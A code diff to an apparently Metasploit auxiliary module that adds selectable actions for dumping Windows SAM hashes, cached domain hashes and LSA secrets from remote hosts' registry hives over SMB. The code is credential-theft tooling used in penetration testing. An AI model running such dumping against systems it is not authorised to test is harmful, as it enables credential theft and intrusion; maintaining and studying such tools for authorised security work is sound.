@@ -44,7 +44,15 @@ class MetasploitModule < Msf::Auxiliary
           'Reliability' => [],
           'Stability' => [],
           'SideEffects' => [ IOC_IN_LOGS ]
-        }
+        },
+        'Actions'     =>
+        [
+          [ 'ALL', 'Description' => 'Dump everything' ],
+          [ 'SAM', 'Description' => 'Dump SAM hashes' ],
+          [ 'CACHE', 'Description' => 'Dump cached hashes' ],
+          [ 'LSA', 'Description' => 'Dump LSA secrets' ]
+        ],
+        'DefaultAction'  => 'ALL'
       )
     )
 
@@ -1069,39 +1077,47 @@ class MetasploitModule < Msf::Auxiliary
 
     lm_hash_not_stored?
 
-    begin
-      sam = save_sam
-    rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
-      sam = nil
+    if ['ALL', 'SAM'].include?(action.name)
+      begin
+        sam = save_sam
+      rescue RubySMB::Error::RubySMBError => e
+        print_error("Error when getting SAM hive ([#{e.class}] #{e}).")
+        sam = nil
+      end
+
+      if sam
+        reg_parser = Msf::Util::WindowsRegistryParser.new(sam)
+        dump_sam_hashes(reg_parser, boot_key)
+      end
     end
 
-    if sam
-      reg_parser = Msf::Util::WindowsRegistryParser.new(sam)
-      dump_sam_hashes(reg_parser, boot_key)
-    end
+    if ['ALL', 'CACHE', 'LSA'].include?(action.name)
+      begin
+        security = save_security
+      rescue RubySMB::Error::RubySMBError => e
+        print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
+        security = nil
+      end
 
-    begin
-      security = save_security
-    rescue RubySMB::Error::RubySMBError => e
-      print_error("Error when getting SECURITY hive ([#{e.class}] #{e}).")
-      security = nil
-    end
-
-    if security
-      reg_parser = Msf::Util::WindowsRegistryParser.new(security)
-      lsa_key = get_lsa_secret_key(reg_parser, boot_key)
-      if lsa_key.nil? || lsa_key.empty?
-        print_status('No LSA key, skip LSA secrets and cached hashes dump')
-      else
-        report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
-        dump_lsa_secrets(reg_parser, lsa_key)
-        nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
-        if nlkm_key.nil? || nlkm_key.empty?
-          print_status('No NLKM key (skip cached hashes dump)')
+      if security
+        reg_parser = Msf::Util::WindowsRegistryParser.new(security)
+        lsa_key = get_lsa_secret_key(reg_parser, boot_key)
+        if lsa_key.nil? || lsa_key.empty?
+          print_status('No LSA key, skip LSA secrets and cached hashes dump')
         else
-          report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
-          dump_cached_hashes(reg_parser, nlkm_key)
+          report_info(lsa_key.unpack('H*')[0], 'host.lsa_key')
+          if ['ALL', 'LSA'].include?(action.name)
+            dump_lsa_secrets(reg_parser, lsa_key)
+          end
+          if ['ALL', 'CACHE'].include?(action.name)
+            nlkm_key = get_nlkm_secret_key(reg_parser, lsa_key)
+            if nlkm_key.nil? || nlkm_key.empty?
+              print_status('No NLKM key (skip cached hashes dump)')
+            else
+              report_info(nlkm_key.unpack('H*')[0], 'host.nlkm_key')
+              dump_cached_hashes(reg_parser, nlkm_key)
+            end
+          end
         end
       end
     end
